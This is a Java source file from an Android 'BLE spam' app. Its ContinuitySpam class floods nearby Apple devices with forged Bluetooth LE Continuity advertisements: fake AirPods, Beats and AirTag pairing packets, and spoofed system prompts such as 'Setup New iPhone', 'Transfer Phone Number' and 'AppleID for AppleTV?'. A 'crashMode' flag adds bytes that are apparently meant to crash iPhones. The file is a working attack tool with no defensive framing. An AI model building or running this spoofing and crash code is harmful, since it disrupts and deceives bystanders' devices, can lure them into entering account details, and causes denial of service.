package com.tutozz.blespam;

import android.bluetooth.le.AdvertiseData;

import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class ContinuitySpam implements Spammer {
    public Runnable blinkRunnable;
    public ContinuityDevice[] devices;
    private int loop = 0;
    public boolean isSpamming = false;
    public boolean crashMode;
    ExecutorService executor = Executors.newSingleThreadExecutor();

    // AirTag-specific data
    private static final String[] AIRTAG_DEVICE_IDS = {"0055", "0030"};
    private static final String[] AIRTAG_DEVICE_NAMES = {"Airtag", "Hermes Airtag"};
    private static final String COLOR_KEY = "00"; // White color for AirTags
    private static final int AIRTAG_PAYLOAD_SIZE = 25; // 0x19
    private static final String AIRTAG_STATUS = "55";

    public ContinuitySpam(ContinuityDevice.type type, boolean crashMode) {
        this.crashMode = crashMode;
        // Init ContinuityDevices
        switch (type) {
            default:
            case DEVICE:
                devices = new ContinuityDevice[]{
                        new ContinuityDevice("0x0E20", "Custom AirPods Pro 1", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x1420", "Custom AirPods Pro 2", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x1420", "Custom AirPods Pro 3", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0E20", "Custom AirPods Pro 4", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0E20", "AirPods Pro", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0620", "Beats Solo 3", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0A20", "AirPods Max", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x1020", "Beats Flex", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0055", "Airtag", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0030", "Hermes Airtag", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0220", "AirPods", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0F20", "AirPods 2nd Gen", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x1320", "AirPods 3rd Gen", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x1420", "AirPods Pro 2nd Gen", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0320", "Powerbeats 3", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0B20", "Powerbeats Pro", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0C20", "Beats Solo Pro", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x1120", "Beats Studio Buds", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0520", "Beats X", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0920", "Beats Studio 3", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x1720", "Beats Studio Pro", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x1220", "Beats Fit Pro", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x1620", "Beats Studio Buds+", ContinuityDevice.type.DEVICE)
                };
                break;
            case ACTION:
                devices = new ContinuityDevice[]{
                        new ContinuityDevice("0x13", "AppleTV AutoFill", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x27", "AppleTV Connecting...", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x20", "Join This AppleTV?", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x19", "AppleTV Audio Sync", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x1E", "AppleTV Color Balance", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x09", "Setup New iPhone", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x02", "Transfer Phone Number", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x0B", "HomePod Setup", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x01", "Setup New AppleTV", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x06", "Pair AppleTV", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x0D", "HomeKit AppleTV Setup", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x2B", "AppleID for AppleTV?", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x05", "Apple Watch", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x24", "Apple Vision Pro", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x2F", "Connect to other Device", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x21", "Software Update", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x2E", "Unlock with Apple Watch", ContinuityDevice.type.ACTION)
                };
                break;
        }
    }

    private String getRandomBudsBatteryLevel() {
        int level = ((new Random().nextInt(10) << 4) + new Random().nextInt(10));
        return String.format("%02X", level);
    }

    private String getRandomChargingCaseBatteryLevel() {
        int level = ((new Random().nextInt(8) % 8) << 4) + (new Random().nextInt(10) % 10);
        return String.format("%02X", level);
    }

    private String getRandomLidOpenCounter() {
        return String.format("%02X", new Random().nextInt(256));
    }

    private String getRandomBytes(int length) {
        byte[] bytes = new byte[length];
        new Random().nextBytes(bytes);
        StringBuilder hex = new StringBuilder();
        for (byte b : bytes) {
            hex.append(String.format("%02X", b & 0xFF));
        }
        return hex.toString();
    }

    public void start() {
        executor.execute(() -> {
            BluetoothAdvertiser b = new BluetoothAdvertiser();
            isSpamming = true;
            for (loop = 0; loop <= Helper.MAX_LOOP; loop++) {
                if (isSpamming) {
                    // Random device
                    ContinuityDevice device = devices[new Random().nextInt(devices.length)];
                    AdvertiseData data = null;

                    if (device.getDeviceType() == ContinuityDevice.type.ACTION) {
                        String rHex = Helper.randomHexFiller(6);
                        String manufacturerData = "0F05C0" + device.getValue() + rHex;
                        if (crashMode) {
                            manufacturerData = "0F05C0" + device.getValue() + rHex + "000010" + rHex;
                        }
                        data = new AdvertiseData.Builder()
                                .addManufacturerData(0x004C, Helper.convertHexToByteArray(manufacturerData))
                                .build();
                    } else if (device.getDeviceType() == ContinuityDevice.type.DEVICE) {
                        String manufacturerData;
                        if (device.getName().equals("Custom AirPods Pro 1")) {
                            manufacturerData = "070F000E204142FD2C9A5B956464640400";
                        } else if (device.getName().equals("Custom AirPods Pro 2")) {
                            manufacturerData = "071301142075AA3733001000E4E407000000000000";
                        } else if (device.getName().equals("Custom AirPods Pro 3")) {
                            manufacturerData = "070F001420CC97AB7DD9BE95E4E4100500";
                        } else if (device.getName().equals("Custom AirPods Pro 4")) {
                            manufacturerData = "0719010E2071AA37370010D760E0789CF7D3DD4C8018F728B31C49";
                        } else if (device.getName().equals("Airtag") || device.getName().equals("Hermes Airtag")) {
                            // Improved AirTag logic
                            String continuityType = "07"; // ProximityPair
                            String payloadSize = "19"; // 25 bytes
                            String prefix = "05"; // New AirTag
                            String deviceId = device.getName().equals("Airtag") ? "0055" : "0030";
                            manufacturerData = continuityType +
                                    payloadSize +
                                    prefix +
                                    deviceId +
                                    AIRTAG_STATUS +
                                    getRandomBudsBatteryLevel() +
                                    getRandomChargingCaseBatteryLevel() +
                                    getRandomLidOpenCounter() +
                                    COLOR_KEY +
                                    "00" +
                                    getRandomBytes(16);
                        } else {
                            // Original logic for other devices
                            String continuityType = "07";
                            String size = "19";
                            String prefix = "01";
                            if (device.getName().equals("Airtag")) prefix = "05"; // Fallback, not used
                            String budsBatteryLevel = String.format("%02X", new Random().nextInt(10) * 10 + new Random().nextInt(10));
                            String caseBatteryLevel = String.format("%02X", new Random().nextInt(8) * 10 + new Random().nextInt(10));
                            String lidOpenCounter = String.format("%02X", new Random().nextInt(256));
                            String filler = Helper.randomHexFiller(32);
                            manufacturerData = continuityType + size + prefix + device.getValue() + "55" + budsBatteryLevel + caseBatteryLevel + lidOpenCounter + "0000" + filler;
                        }
                        data = new AdvertiseData.Builder()
                                .addManufacturerData(0x004C, Helper.convertHexToByteArray(manufacturerData))
                                .build();
                    }
                    // Advertise
                    b.advertise(data, null);
                    // Wait before next advertise
                    try {
                        System.out.println(Helper.delay);
                        Thread.sleep(Helper.delay);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    // Stop this advertise to start the next one
                    b.stopAdvertising();
                }
            }
        });
    }

    public boolean isSpamming() {
        return isSpamming;
    }

    public void stop() {
        loop = Helper.MAX_LOOP + 1;
        isSpamming = false;
    }

    public Runnable getBlinkRunnable() {
        return blinkRunnable;
    }

    public void setBlinkRunnable(Runnable blinkRunnable) {
        this.blinkRunnable = blinkRunnable;
    }
}